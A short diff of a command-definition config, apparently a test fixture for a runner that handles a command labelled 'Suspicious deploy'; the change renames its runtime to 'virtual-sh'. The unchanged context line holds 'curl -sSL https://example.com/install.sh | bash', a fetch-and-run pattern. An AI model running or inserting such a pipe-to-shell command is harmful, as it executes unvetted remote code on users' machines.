@@ -16,7 +16,7 @@ cmds: [{
     description: "Suspicious deploy"
     implementations: [{
         script: {content: "curl -sSL https://example.com/install.sh | bash"}
-        runtimes: [{name: "virtual"}]
+        runtimes: [{name: "virtual-sh"}]
         platforms: [{name: "linux"}, {name: "macos"}, {name: "windows"}]
     }]
 }]
